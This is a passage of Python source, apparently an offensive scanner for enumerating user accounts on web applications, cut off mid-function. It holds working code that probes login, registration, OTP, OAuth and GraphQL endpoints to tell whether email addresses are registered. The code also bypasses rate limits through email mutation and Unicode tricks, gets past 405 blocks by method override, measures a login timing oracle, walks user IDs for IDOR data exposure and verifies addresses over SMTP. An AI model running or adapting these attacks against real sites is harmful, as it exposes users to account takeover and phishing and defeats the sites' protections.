                        signals.append(("json_structure", 0.4, f"new JSON keys: {', '.join(list(new_keys)[:5])}"))
                except (json.JSONDecodeError, AttributeError):
                    pass
        except (json.JSONDecodeError, ValueError):
            pass

        # Plugin signals
        self.plugin_mgr.run_signal_detectors(resp, baseline, signals)

        # Verdict
        if not signals:
            result.exists = False if is_not_found else None
            result.confidence = Confidence.MEDIUM if is_not_found else Confidence.UNKNOWN
            result.evidence = ["no differentiating signals"]
            return result

        max_weight = max(s[1] for s in signals)
        result.evidence = [s[2] for s in sorted(signals, key=lambda x: -x[1])]

        if max_weight >= 0.9:
            result.exists = True
            result.confidence = Confidence.CONFIRMED
        elif max_weight >= 0.7:
            result.exists = True
            result.confidence = Confidence.HIGH
        elif max_weight >= 0.5 or len(signals) >= 3:
            result.exists = True
            result.confidence = Confidence.MEDIUM
        elif len(signals) >= 2:
            result.exists = True
            result.confidence = Confidence.LOW
        else:
            result.exists = None
            result.confidence = Confidence.LOW
            result.evidence.insert(0, "weak signal")
        return result

    def _analyze_json(self, data: dict, signals: list, prefix: str):
        for key, val in data.items():
            full_key = f"{prefix}.{key}" if prefix else key
            key_lower = key.lower()
            if key_lower in ("exists", "found", "registered", "taken", "is_registered", "is_taken", "email_exists", "user_exists"):
                if val is True:
                    signals.append(("json_bool", 0.95, f"json {full_key}=true"))
            elif key_lower in ("available", "is_available"):
                if val is False:
                    signals.append(("json_bool", 0.95, f"json {full_key}=false (taken)"))
            elif key_lower in ("user", "account", "profile") and isinstance(val, dict):
                if val.get("id") or val.get("email") or val.get("username"):
                    signals.append(("json_object", 0.9, f"json {full_key} contains user data"))
            elif key_lower in ("error", "message", "msg"):
                if isinstance(val, str):
                    val_lower = val.lower()
                    for sig in EXISTING_SIGNALS:
                        if sig in val_lower:
                            signals.append(("json_msg", 0.9, f"json {full_key}: '{val}'"))
                            return
            elif isinstance(val, dict):
                self._analyze_json(val, signals, full_key)
            elif key_lower == "errors" and isinstance(val, list):
                for err in val:
                    if isinstance(err, dict):
                        msg = str(err.get("message", err.get("msg", ""))).lower()
                        for sig in EXISTING_SIGNALS:
                            if sig in msg:
                                signals.append(("json_error", 0.9, f"json error: '{msg}'"))
                                return
                    elif isinstance(err, str):
                        for sig in EXISTING_SIGNALS:
                            if sig in err.lower():
                                signals.append(("json_error", 0.9, f"json error: '{err}'"))
                                return

    def _send_enum_request(self, ep: EndpointInfo, email: str,
                           extra_params: Optional[dict] = None,
                           override_password: Optional[str] = None) -> tuple[Optional[requests.Response], float]:
        headers = self._headers()
        headers["Accept"] = "application/json, text/html, */*"
        headers["Origin"] = self.target.rstrip("/")
        headers["Referer"] = self.target.rstrip("/") + "/"

        data: dict[str, Any] = {ep.email_param: email}
        password = override_password or f"BbT3st!{hashlib.md5(os.urandom(4)).hexdigest()[:8]}Xx"
        if ep.vector in (Vector.LOGIN, Vector.REGISTER):
            data[ep.password_param] = password
        if ep.vector == Vector.REGISTER:
            data.setdefault("name", f"Test {hashlib.md5(email.encode()).hexdigest()[:4]}")
            data.setdefault("username", f"tester_{hashlib.md5(email.encode()).hexdigest()[:8]}")
            data.setdefault("confirm_password", password)
            data.setdefault("password_confirmation", password)
            data.setdefault("terms", True)
            data.setdefault("agree", True)
        if ep.vector == Vector.OTP:
            data.setdefault("type", "email")
            data.setdefault("channel", "email")
        if ep.requires_csrf:
            token = self._fetch_csrf(ep)
            if token:
                data[ep.csrf_field] = token
        if extra_params:
            data.update(extra_params)
        if ep.vector == Vector.GRAPHQL:
            return self._graphql_enum(ep, email, headers)

        start = time.time()
        if ep.content_type == "application/json":
            headers["Content-Type"] = "application/json"
            resp = self._request(ep.method, ep.url, json=data, headers=headers)
        elif ep.content_type == "application/xml":
            headers["Content-Type"] = "application/xml"
            xml_body = f'<?xml version="1.0"?><request><email>{email}</email></request>'
            resp = self._request(ep.method, ep.url, data=xml_body, headers=headers)
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            resp = self._request(ep.method, ep.url, data=data, headers=headers)
        elapsed = time.time() - start

        if resp and resp.status_code in (400, 415, 422) and ep.content_type != "application/json":
            headers["Content-Type"] = "application/json"
            start2 = time.time()
            resp2 = self._request(ep.method, ep.url, json=data, headers=headers)
            elapsed2 = time.time() - start2
            if resp2 and resp2.status_code not in (400, 415, 405):
                ep.content_type = "application/json"
                return resp2, elapsed2

        return resp, elapsed

    def _graphql_enum(self, ep: EndpointInfo, email: str, headers: dict) -> tuple[Optional[requests.Response], float]:
        queries = [
            {"query": f'mutation {{ login(input: {{email: "{email}", password: "test123"}}) {{ success message user {{ id }} }} }}'},
            {"query": f'{{ user(email: "{email}") {{ id email username }} }}'},
            {"query": f'mutation {{ forgotPassword(email: "{email}") {{ success message }} }}'},
            {"query": f'mutation {{ checkEmail(email: "{email}") {{ exists available }} }}'},
            {"query": f'mutation {{ register(input: {{email: "{email}", password: "Test123!"}}) {{ success message }} }}'},
            {"query": f'{{ userByEmail(email: "{email}") {{ id }} }}'},
        ]
        introspection = {"query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}
        intro_resp = self._request("POST", ep.url, json=introspection, headers=headers)
        if intro_resp and intro_resp.status_code == 200:
            try:
                schema = intro_resp.json()
                qt = schema.get("data", {}).get("__schema", {})
                fields = []
                for t in [qt.get("queryType", {}), qt.get("mutationType", {})]:
                    if t and "fields" in t:
                        fields.extend(f["name"] for f in t["fields"])
                auth_fields = [f for f in fields if any(kw in f.lower() for kw in
                               ("user", "login", "register", "signup", "forgot", "check", "email", "account", "auth"))]
                if auth_fields and self.verbose:
                    print(f"  {Fore.GREEN}[GQL] Auth fields: {', '.join(auth_fields[:10])}{Style.RESET_ALL}")
            except Exception:
                pass
        for q in queries:
            start = time.time()
            resp = self._request("POST", ep.url, json=q, headers=headers)
            elapsed = time.time() - start
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "errors" not in data or "data" in data:
                        return resp, elapsed
                except Exception:
                    pass
            time.sleep(self.delay * 0.5)
        return None, 0.0

    def _fetch_csrf(self, ep: EndpointInfo) -> Optional[str]:
        path = urllib.parse.urlparse(ep.url).path
        pages = [path, path.rsplit("/", 1)[0], "/"]
        for page in pages:
            page_url = f"{self.target}{page}"
            resp = self._request("GET", page_url)
            if resp is None:
                continue
            if HAS_BS4:
                soup = BeautifulSoup(resp.text, "html.parser")
                token = soup.find("input", {"name": ep.csrf_field})
                if token:
                    return token.get("value")
                meta = soup.find("meta", {"name": re.compile(r'csrf|_token', re.I)})
                if meta:
                    return meta.get("content")
            match = re.search(
                r'(?:name|data-csrf)[=\s]*["\']?' + re.escape(ep.csrf_field) + r'["\']?\s+(?:value|content)[=\s]*["\']([^"\']+)',
                resp.text, re.I,
            )
            if match:
                return match.group(1)
            match2 = re.search(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)', resp.text, re.I)
            if match2:
                return match2.group(1)
        return None

    def _body_similarity(self, a: str, b: str) -> float:
        if not a and not b:
            return 1.0
        if not a or not b:
            return 0.0
        return difflib.SequenceMatcher(None, a[:2000], b[:2000]).ratio()

    def _marker(self, conf: Confidence) -> str:
        m = {
            Confidence.CONFIRMED: f"{Fore.RED}[CONFIRMED]",
            Confidence.HIGH: f"{Fore.RED}[HIGH]     ",
            Confidence.MEDIUM: f"{Fore.YELLOW}[MEDIUM]   ",
            Confidence.LOW: f"{Fore.WHITE}[LOW]      ",
            Confidence.UNKNOWN: f"{Fore.WHITE}[???]      ",
        }
        return m.get(conf, "[???]")

    # == Phase 5: Rate Limit Bypass via Email Mutation ==

    def rate_limit_bypass_enum(self, emails: list[str]):
        if not self.full:
            return
        active = [ep for ep in self.discovered_endpoints
                  if ep.url in self.baselines and ep.rate_limited]
        if not active:
            active = [ep for ep in self.discovered_endpoints if ep.url in self.baselines][:2]
        if not active:
            return
        print(f"\n{Fore.CYAN}[*] Phase 5: Rate Limit Bypass via Email Mutation{Style.RESET_ALL}")
        mutator = EmailMutator()
        for email in emails:
            variants = mutator.generate(email)
            for ep in active:
                for variant in variants[1:]:
                    resp, elapsed = self._send_enum_request(ep, variant)
                    if resp is None:
                        continue
                    baseline = self.baselines.get(ep.url)
                    if not baseline:
                        continue
                    body = resp.text.lower()
                    for sig in EXISTING_SIGNALS:
                        if sig in body:
                            result = EnumResult(
                                email=email, vector=f"mutation:{ep.vector.value}",
                                endpoint=ep.url, exists=True,
                                confidence=Confidence.HIGH,
                                evidence=[f"mutation '{variant}' triggered: '{sig}'"],
                                status_code=resp.status_code, response_time=elapsed,
                            )
                            self.results.append(result)
                            print(f"  {Fore.RED}[MUTATION] {email} via '{variant}' -- '{sig}'{Style.RESET_ALL}")
                            break
                    self.rate_handler.wait(ep.url)

    # == Phase 6: IDOR Enumeration ==

    def idor_enum(self):
        if not self.full:
            return
        print(f"\n{Fore.CYAN}[*] Phase 6: IDOR Enumeration{Style.RESET_ALL}")
        test_ids = list(range(1, 21)) + [100, 1000, 99999]
        targets = [self.target] + self.subdomains

        for base in targets:
            for path_template in IDOR_PATHS:
                for test_id in test_ids:
                    url = f"{base}{path_template.format(id=test_id)}"
                    resp = self._request("GET", url)
                    if resp is None:
                        continue
                    if resp.status_code in (200, 201):
                        try:
                            data = resp.json()
                            if isinstance(data, dict) and any(k in data for k in ("email", "user", "username", "id", "name")):
                                found_email = data.get("email", "")
                                self.idor_results.append({
                                    "url": url, "id": test_id,
                                    "email": found_email,
                                    "data_keys": list(data.keys())[:10],
                                })
                                print(f"  {Fore.RED}[IDOR] {url} -- {found_email or 'user data exposed'}{Style.RESET_ALL}")
                                if found_email and "@" in found_email:
                                    result = EnumResult(
                                        email=found_email, vector="idor",
                                        endpoint=url, exists=True,
                                        confidence=Confidence.CONFIRMED,
                                        evidence=[f"IDOR at {url}, id={test_id}"],
                                        status_code=resp.status_code,
                                    )
                                    self.results.append(result)
                        except (json.JSONDecodeError, ValueError):
                            pass
                    self.rate_handler.wait(url)

    # == Phase 7: Timing Oracle ==

    def timing_attack(self, emails: list[str], samples: int = 10):
        login_eps = [ep for ep in self.discovered_endpoints
                     if ep.vector == Vector.LOGIN and ep.url in self.baselines]
        if not login_eps:
            print(f"\n{Fore.YELLOW}[!] No login endpoints for timing oracle{Style.RESET_ALL}")
            return
        print(f"\n{Fore.CYAN}[*] Phase 7: Timing Oracle ({samples} samples/email){Style.RESET_ALL}")
        for ep in login_eps:
            baseline = self.baselines[ep.url]
            print(f"  Endpoint: {ep.url} (baseline: {baseline.avg_time:.3f}s +/- {baseline.std_time:.3f}s)")
            for email in emails:
                timings = []
                for _ in range(samples):
                    _, elapsed = self._send_enum_request(ep, email)
                    if elapsed > 0:
                        timings.append(elapsed)
                    self.rate_handler.wait(ep.url)
                if len(timings) < 3:
                    continue
                avg = statistics.mean(timings)
                std = statistics.stdev(timings)
                median = statistics.median(timings)
                delta = avg - baseline.avg_time
                z_score = delta / baseline.std_time if baseline.std_time > 0 else 0
                if z_score > 3.0 or delta > max(baseline.std_time * 4, 0.3):
                    conf = Confidence.HIGH if z_score > 5.0 else Confidence.MEDIUM
                    result = EnumResult(
                        email=email, vector="timing_oracle", endpoint=ep.url,
                        exists=True, confidence=conf,
                        evidence=[
                            f"avg={avg:.3f}s median={median:.3f}s std={std:.3f}s",
                            f"baseline={baseline.avg_time:.3f}s d={delta:.3f}s z={z_score:.1f}",
                        ],
                        response_time=avg,
                    )
                    self.results.append(result)
                    print(f"    {Fore.RED}[TIMING] {email} -- d{delta:.3f}s z={z_score:.1f}{Style.RESET_ALL}")
                elif self.verbose:
                    print(f"    {Fore.GREEN}[OK] {email} -- d{delta:.3f}s z={z_score:.1f}{Style.RESET_ALL}")

    # == Phase 8: OAuth Flow Enumeration ==

    def oauth_enum(self, emails: list[str]):
        if not self.full:
            return
        oauth_eps = [ep for ep in self.discovered_endpoints if ep.vector == Vector.OAUTH]
        if not oauth_eps and not self.oauth_info:
            return
        print(f"\n{Fore.CYAN}[*] Phase 8: OAuth Flow Enumeration{Style.RESET_ALL}")
        auth_ep = self.oauth_info.get("authorization_endpoint", "")
        if auth_ep:
            for email in emails:
                params = {
                    "response_type": "code",
                    "client_id": "test",
                    "redirect_uri": f"{self.target}/callback",
                    "scope": "openid email profile",
                    "login_hint": email,
                }
                resp = self._request("GET", auth_ep, params=params)
                if resp is None:
                    continue
                body = resp.text.lower()
                if resp.status_code == 302:
                    loc = resp.headers.get("Location", "")
                    if "error" not in loc.lower():
                        print(f"  {Fore.GREEN}[OAUTH] {email} -- redirect to auth (valid hint){Style.RESET_ALL}")
                for sig in EXISTING_SIGNALS:
                    if sig in body:
                        result = EnumResult(
                            email=email, vector="oauth",
                            endpoint=auth_ep, exists=True,
                            confidence=Confidence.MEDIUM,
                            evidence=[f"OAuth flow: '{sig}'"],
                            status_code=resp.status_code,
                        )
                        self.results.append(result)
                        print(f"  {Fore.RED}[OAUTH] {email} -- '{sig}'{Style.RESET_ALL}")
                        break
                self.rate_handler.wait(auth_ep)

    # == Phase 9: Multi-Step Auth Detection ==

    def multistep_auth_enum(self, emails: list[str]):
        if not self.full:
            return
        login_eps = [ep for ep in self.discovered_endpoints
                     if ep.vector == Vector.LOGIN and ep.url in self.baselines]
        if not login_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 9: Multi-Step Auth Detection{Style.RESET_ALL}")
        for ep in login_eps:
            for email in emails:
                resp, elapsed = self._send_enum_request(ep, email)
                if resp is None:
                    continue
                body = resp.text.lower()
                is_multistep = False
                if resp.status_code in (200, 302):
                    if any(kw in body for kw in ("2fa", "two-factor", "verification code", "enter code",
                                                  "mfa", "authenticator", "sms code", "otp",
                                                  "security code", "second factor")):
                        is_multistep = True
                        chain = {
                            "email": email, "endpoint": ep.url,
                            "step2_type": "2fa_required",
                            "evidence": [kw for kw in ("2fa", "two-factor", "mfa", "otp", "verification code")
                                        if kw in body],
                        }
                        self.multistep_chains.append(chain)
                        result = EnumResult(
                            email=email, vector="multistep_auth",
                            endpoint=ep.url, exists=True,
                            confidence=Confidence.HIGH,
                            evidence=[f"2FA/MFA required: {', '.join(chain['evidence'])}"],
                            status_code=resp.status_code,
                            response_time=elapsed,
                        )
                        self.results.append(result)
                        print(f"  {Fore.RED}[2FA] {email} -- MFA required ({', '.join(chain['evidence'][:2])}){Style.RESET_ALL}")
                    elif resp.is_redirect:
                        loc = resp.headers.get("Location", "").lower()
                        if any(kw in loc for kw in ("2fa", "mfa", "verify", "otp", "challenge")):
                            is_multistep = True
                            self.multistep_chains.append({
                                "email": email, "endpoint": ep.url,
                                "step2_type": "redirect_to_2fa",
                                "redirect": resp.headers.get("Location", ""),
                            })
                            result = EnumResult(
                                email=email, vector="multistep_auth",
                                endpoint=ep.url, exists=True,
                                confidence=Confidence.HIGH,
                                evidence=[f"redirect to 2FA: {resp.headers.get('Location', '')}"],
                                status_code=resp.status_code,
                            )
                            self.results.append(result)
                            print(f"  {Fore.RED}[2FA] {email} -- redirect to {resp.headers.get('Location', '')}{Style.RESET_ALL}")
                self.rate_handler.wait(ep.url)

    # == Phase 10: Password Policy ==

    def enum_password_policy(self):
        reg_eps = [ep for ep in self.discovered_endpoints
                   if ep.vector in (Vector.REGISTER,) and ep.url in self.baselines]
        if not reg_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 10: Password Policy Enumeration{Style.RESET_ALL}")
        for ep in reg_eps:
            policy = self.password_policy.probe(self._send_enum_request, ep)
            if any(v is not None for v in policy.values()):
                print(f"  {ep.url}:")
                for k, v in policy.items():
                    if v is not None:
                        print(f"    {k}: {v}")

    # == Session Token Analysis ==

    def analyze_sessions(self, emails: list[str]):
        if not self.full:
            return
        login_eps = [ep for ep in self.discovered_endpoints
                     if ep.vector == Vector.LOGIN and ep.url in self.baselines]
        if not login_eps:
            return
        print(f"\n{Fore.CYAN}[*] Session Token Entropy Analysis{Style.RESET_ALL}")
        existing_tokens: list[str] = []
        nonexistent_tokens: list[str] = []

        for ep in login_eps[:1]:
            for email in emails[:5]:
                resp, _ = self._send_enum_request(ep, email)
                if resp:
                    for cookie_name, cookie_val in resp.cookies.items():
                        if any(kw in cookie_name.lower() for kw in ("session", "token", "sid", "auth")):
                            existing_tokens.append(cookie_val)
            for _ in range(5):
                fake = f"nonexist_{hashlib.md5(os.urandom(8)).hexdigest()[:10]}@example.com"
                resp, _ = self._send_enum_request(ep, fake)
                if resp:
                    for cookie_name, cookie_val in resp.cookies.items():
                        if any(kw in cookie_name.lower() for kw in ("session", "token", "sid", "auth")):
                            nonexistent_tokens.append(cookie_val)

        comparison = SessionAnalyzer.compare_tokens(existing_tokens, nonexistent_tokens)
        if comparison.get("diff"):
            print(f"  {Fore.RED}[SESSION] Token entropy differs between existing/nonexistent users{Style.RESET_ALL}")
            print(f"    Existing avg entropy: {comparison.get('existing_entropy_avg', 0):.2f}")
            print(f"    Nonexistent avg entropy: {comparison.get('nonexistent_entropy_avg', 0):.2f}")
        elif existing_tokens or nonexistent_tokens:
            print(f"  {Fore.GREEN}[SESSION] No significant token entropy difference{Style.RESET_ALL}")

    # == v3.4 Advanced Phases ==

    def advanced_recon(self):
        if not (self.deep or self.full):
            return
        print(f"\n{Fore.CYAN}[*] Phase 11: Advanced Recon (v3.4){Style.RESET_ALL}")

        print(f"  {Fore.WHITE}[DNS-INTEL] Gathering DNS intelligence{Style.RESET_ALL}")
        dns_intel = DNSIntelligence(self.target, verbose=self.verbose)
        dns_info = dns_intel.gather()
        if dns_intel.mx_records:
            print(f"    MX: {', '.join(dns_intel.mx_records[:5])}")
        if dns_intel.email_provider:
            print(f"    Email provider: {dns_intel.email_provider}")
        if dns_intel.cloud_provider:
            print(f"    Cloud: {dns_intel.cloud_provider}")
        if dns_intel.spf_record:
            print(f"    SPF: {dns_intel.spf_record[:80]}...")
        if dns_intel.dmarc_record:
            print(f"    DMARC: {dns_intel.dmarc_record[:80]}...")
        self.tech_stack.update({"dns_intel": dns_info})

        print(f"  {Fore.WHITE}[CERT] TLS certificate intelligence{Style.RESET_ALL}")
        parsed = urllib.parse.urlparse(self.target)
        cert_intel = CertIntelligence(parsed.hostname or "")
        cert_info = cert_intel.gather()
        if cert_intel.san_domains:
            new_subs = [d for d in cert_intel.san_domains
                        if d not in self.subdomains and "*" not in d]
            if new_subs:
                print(f"    {len(new_subs)} new domains from SAN: {', '.join(new_subs[:10])}")
                parsed_t = urllib.parse.urlparse(self.target)
                scheme = parsed_t.scheme or "https"
                for d in new_subs:
                    self.subdomains.append(f"{scheme}://{d}")
        if cert_intel.issuer:
            print(f"    Issuer: {cert_intel.issuer[:60]}")
        self.tech_stack.update({"cert_intel": cert_info})

        print(f"  {Fore.WHITE}[CORS] Scanning for CORS misconfigurations{Style.RESET_ALL}")
        cors = CORSScanner(self._request, self.target)
        cors_findings = cors.scan(self.discovered_endpoints)
        if cors_findings:
            for f in cors_findings:
                sev = f["severity"]
                cred = " +credentials" if f["credentials"] else ""
                print(f"    {Fore.RED}[{sev.upper()}] {f['url']} reflects origin {f['origin']}{cred}{Style.RESET_ALL}")
        else:
            print(f"    {Fore.GREEN}No CORS misconfigurations found{Style.RESET_ALL}")

        if self.full and self.subdomains:
            print(f"  {Fore.WHITE}[TAKEOVER] Checking {len(self.subdomains)} subdomains for takeover{Style.RESET_ALL}")
            takeover = SubdomainTakeoverChecker(self._request, verbose=self.verbose)
            vulnerable = takeover.check(self.subdomains[:30])
            if vulnerable:
                for v in vulnerable:
                    print(f"    {Fore.RED}[VULNERABLE] {v['subdomain']} -> {v['cname']} ({v['service']}){Style.RESET_ALL}")
            else:
                print(f"    {Fore.GREEN}No subdomain takeover vulnerabilities{Style.RESET_ALL}")

        print(f"  {Fore.WHITE}[WEBSOCKET] Probing WebSocket endpoints{Style.RESET_ALL}")
        ws = WebSocketProber(self.target, verbose=self.verbose)
        ws_eps = ws.probe()
        if ws_eps:
            for ep in ws_eps:
                print(f"    {Fore.GREEN}[WS] {ep}{Style.RESET_ALL}")
        else:
            print(f"    No WebSocket endpoints found")

        print(f"  {Fore.WHITE}[PATH-FUZZ] RESTful path parameter fuzzing{Style.RESET_ALL}")
        pfuzz = PathParamFuzzer(self._request, self.target, self.subdomains[:3])
        path_eps = pfuzz.fuzz()
        if path_eps:
            for ep in path_eps:
                print(f"    {Fore.GREEN}[REST] {ep.method} {ep.url} [{ep.vector.value}]{Style.RESET_ALL}")
                self.discovered_endpoints.append(ep)
        else:
            print(f"    No RESTful user lookup patterns found")

        if self.full:
            print(f"  {Fore.WHITE}[RATELIMIT] Mapping rate limit windows{Style.RESET_ALL}")
            rl_mapper = RateLimitMapper(self._request)
            active = [ep for ep in self.discovered_endpoints if not ep.captcha_enforced][:3]
            for ep in active:
                rl_info = rl_mapper.map_endpoint(ep, self.target)
                limit = rl_info.get("limit", "?")
                window = rl_info.get("window", "?")
                print(f"    {ep.url}: {limit} requests in {window}s")
                rl_headers = rl_info.get("headers", {})
                if rl_headers:
                    for h, v in rl_headers.items():
                        print(f"      {h}: {v}")

    def smtp_verify(self, emails: list[str]):
        if not self.full:
            return
        print(f"\n{Fore.CYAN}[*] Phase 12: SMTP Verification{Style.RESET_ALL}")
        verifier = SMTPVerifier(verbose=self.verbose)
        domains = set(e.split("@")[-1] for e in emails if "@" in e)
        print(f"  Checking {len(domains)} domain(s) via SMTP VRFY/RCPT TO")
        domain_results: dict[str, dict] = {}
        test_emails = []
        for domain in domains:
            probe = f"smtptest_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@{domain}"
            dr = verifier.verify_email(probe)
            domain_results[domain] = dr
            if not dr["mx_exists"]:
                print(f"  {Fore.YELLOW}[SMTP] {domain}: no MX records{Style.RESET_ALL}")
            elif dr["smtp_vrfy"] == "disabled" and dr["smtp_rcpt"] is None:
                print(f"  {Fore.YELLOW}[SMTP] {domain}: VRFY disabled, RCPT blocked{Style.RESET_ALL}")
            elif dr["catchall"] is True:
                print(f"  {Fore.YELLOW}[SMTP] {domain}: catch-all (accepts all addresses){Style.RESET_ALL}")
            else:
                test_emails.extend([e for e in emails if e.endswith(f"@{domain}")])

        if not test_emails:
            print(f"  {Fore.YELLOW}[SMTP] No domains suitable for SMTP verification{Style.RESET_ALL}")
            return

        verified_count = 0
        for email in test_emails[:50]:
            result = verifier.verify_email(email)
            if result["smtp_rcpt"] == "accepted" and not result.get("catchall"):
                verified_count += 1
                existing = next((r for r in self.results if r.email == email), None)
                if existing:
                    existing.confidence = Confidence.CONFIRMED
                    existing.evidence.insert(0, "SMTP RCPT TO accepted")
                    print(f"  {Fore.GREEN}[SMTP-CONFIRMED] {email}{Style.RESET_ALL}")
                else:
                    self.results.append(EnumResult(
                        email=email, vector="smtp", endpoint="SMTP",
                        status_code=0, response_time=0, content_length=0,
                        exists=True, confidence=Confidence.HIGH,
                        evidence=["SMTP RCPT TO accepted"],
                    ))
                    print(f"  {Fore.GREEN}[SMTP-HIT] {email}{Style.RESET_ALL}")
            elif result["smtp_rcpt"] == "rejected":
                existing = next((r for r in self.results if r.email == email), None)
                if existing and existing.confidence in (Confidence.LOW, Confidence.UNKNOWN):
                    existing.exists = False
                    existing.evidence.insert(0, "SMTP RCPT TO rejected")
                    print(f"  {Fore.YELLOW}[SMTP-REJECT] {email} -- downgraded{Style.RESET_ALL}")

        print(f"  {Fore.GREEN}[SMTP] {verified_count} email(s) confirmed via SMTP{Style.RESET_ALL}")

    def unicode_bypass_enum(self, emails: list[str]):
        if not self.full:
            return
        active = [ep for ep in self.discovered_endpoints
                  if ep.url in self.baselines and not ep.captcha_enforced]
        if not active:
            return
        print(f"\n{Fore.CYAN}[*] Phase 13: Unicode/Encoding Bypass Enumeration{Style.RESET_ALL}")
        bypass_hits = 0
        for email in emails[:20]:
            variants = UnicodeBypassEngine.generate_variants(email)
            for ep in active[:3]:
                baseline = self.baselines.get(ep.url)
                if not baseline:
                    continue
                for trick_name, variant in variants[:10]:
                    resp, elapsed = self._send_enum_request(ep, variant)
                    if resp is None:
                        continue
                    body = resp.text.lower()
                    for sig in EXISTING_SIGNALS:
                        if sig in body:
                            bypass_hits += 1
                            print(f"  {Fore.GREEN}[UNICODE] {email} via {trick_name} -> '{sig}'{Style.RESET_ALL}")
                            existing = next((r for r in self.results if r.email == email), None)
                            if existing:
                                existing.evidence.append(f"unicode bypass ({trick_name})")
                                if existing.confidence in (Confidence.LOW, Confidence.UNKNOWN):
                                    existing.confidence = Confidence.MEDIUM
                            else:
                                self.results.append(EnumResult(
                                    email=email, vector=ep.vector.value,
                                    endpoint=ep.url, status_code=resp.status_code,
                                    response_time=elapsed, content_length=len(resp.text),
                                    exists=True, confidence=Confidence.MEDIUM,
                                    evidence=[f"unicode bypass ({trick_name}): '{sig}'"],
                                ))
                            break
                    self.rate_handler.wait(ep.url)
        if bypass_hits:
            print(f"  {Fore.GREEN}[UNICODE] {bypass_hits} additional hits via encoding bypass{Style.RESET_ALL}")
        else:
            print(f"  {Fore.WHITE}[UNICODE] No additional hits from encoding tricks{Style.RESET_ALL}")

    def graphql_batch_enum(self, emails: list[str]):
        gql_eps = [ep for ep in self.discovered_endpoints if ep.vector == Vector.GRAPHQL]
        if not gql_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 14: GraphQL Batch Enumeration{Style.RESET_ALL}")
        engine = GraphQLBatchEngine(self._request)
        for ep in gql_eps:
            headers = self._headers()
            headers["Content-Type"] = "application/json"
            results = engine.batch_check(ep.url, emails, headers)
            if results:
                print(f"  {Fore.GREEN}[GQL-BATCH] {len(results)} results from batch query at {ep.url}{Style.RESET_ALL}")
                for r in results:
                    data = r["data"]
                    email = r["email"]
                    exists = False
                    if isinstance(data, dict):
                        if data.get("exists") is True or data.get("id"):
                            exists = True
                        elif data.get("available") is False:
                            exists = True
                    if exists:
                        print(f"    {Fore.GREEN}[GQL] {email} EXISTS{Style.RESET_ALL}")
                        existing = next((res for res in self.results if res.email == email), None)
                        if existing:
                            existing.confidence = Confidence.CONFIRMED
                            existing.evidence.insert(0, f"GraphQL batch: {r['mutation']}")
                        else:
                            self.results.append(EnumResult(
                                email=email, vector="graphql_batch",
                                endpoint=ep.url, status_code=200,
                                response_time=0, content_length=0,
                                exists=True, confidence=Confidence.HIGH,
                                evidence=[f"GraphQL batch: {r['mutation']} -> {data}"],
                            ))

    def method_override_scan(self):
        if not self.deep:
            return
        blocked_eps = [ep for ep in self.discovered_endpoints
                       if ep.status_code == 405 and not ep.captcha_enforced]
        if not blocked_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 15: HTTP Method Override Bypass{Style.RESET_ALL}")
        for ep in blocked_eps[:5]:
            resp = HTTPMethodOverride.try_overrides(self._request, ep.url, headers=self._headers())
            if resp:
                print(f"  {Fore.GREEN}[OVERRIDE] {ep.url} -- bypassed 405 via method override (status={resp.status_code}){Style.RESET_ALL}")
                ep.status_code = resp.status_code
            else:
                if self.verbose:
                    print(f"  {Fore.YELLOW}[OVERRIDE] {ep.url} -- no bypass found{Style.RESET_ALL}")

    def jwt_analysis(self, emails: list[str]):
        if not self.full:
            return
        active = [ep for ep in self.discovered_endpoints
                  if ep.vector == Vector.LOGIN and ep.url in self.baselines
                  and not ep.captcha_enforced]
        if not active:
            return
        print(f"\n{Fore.CYAN}[*] Phase 16: JWT Token Analysis{Style.RESET_ALL}")
        baseline_jwts = []
        for ep in active[:1]:
            for _ in range(3):
                fake = f"jwtprobe_{hashlib.md5(os.urandom(4)).hexdigest()[:8]}@example.com"
                resp, _ = self._send_enum_request(ep, fake)
                if resp:
                    tokens = JWTAnalyzer.extract_jwts(resp)
                    baseline_jwts.extend(tokens)
            for email in emails[:10]:
                resp, _ = self._send_enum_request(ep, email)
                if resp:
                    tokens = JWTAnalyzer.extract_jwts(resp)
                    if tokens and baseline_jwts:
                        for tok in tokens:
                            diffs = JWTAnalyzer.compare_claims(baseline_jwts[0], tok)
                            if diffs:
                                print(f"  {Fore.GREEN}[JWT] {email}: claim differences detected{Style.RESET_ALL}")
                                for d in diffs[:3]:
                                    print(f"    {d}")
                                existing = next((r for r in self.results if r.email == email), None)
                                if existing:
                                    existing.evidence.append(f"JWT claims differ: {diffs[0]}")
                                    if existing.confidence in (Confidence.LOW, Confidence.UNKNOWN):
                                        existing.confidence = Confidence.MEDIUM
                    elif tokens and not baseline_jwts:
                        print(f"  {Fore.GREEN}[JWT] {email}: JWT issued (no baseline JWT){Style.RESET_ALL}")
                self.rate_handler.wait(ep.url)

        if not baseline_jwts:
            print(f"  {Fore.WHITE}[JWT] No JWT tokens found in responses{Style.RESET_ALL}")

    def entropy_analysis(self, emails: list[str]):
        if not self.full:
            return
        active = [ep for ep in self.discovered_endpoints
                  if ep.url in self.baselines and not ep.captcha_enforced]
        if not active:
            return
        print(f"\n{Fore.CYAN}[*] Phase 17: Response Entropy Analysis{Style.RESET_ALL}")
        entropy_analyzer = ResponseEntropyAnalyzer()
        for ep in active[:3]:
            baseline = self.baselines.get(ep.url)
            if not baseline or not baseline.bodies:
                continue
            baseline_entropy = entropy_analyzer.shannon_entropy(baseline.bodies[0])
            significant_diffs = 0
            for email in emails[:15]:
                resp, _ = self._send_enum_request(ep, email)
                if resp:
                    comparison = entropy_analyzer.compare(baseline.bodies[0], resp.text)
                    if comparison["significant"]:
                        significant_diffs += 1
                        if self.verbose:
                            print(f"    {email}: entropy diff={comparison['diff']:.4f}")
                        existing = next((r for r in self.results if r.email == email), None)
                        if existing:
                            existing.evidence.append(f"entropy divergence d{comparison['diff']:.4f}")
                self.rate_handler.wait(ep.url)
            if significant_diffs:
                print(f"  {Fore.GREEN}[ENTROPY] {ep.url}: {significant_diffs} emails with significant entropy divergence{Style.RESET_ALL}")
            else:
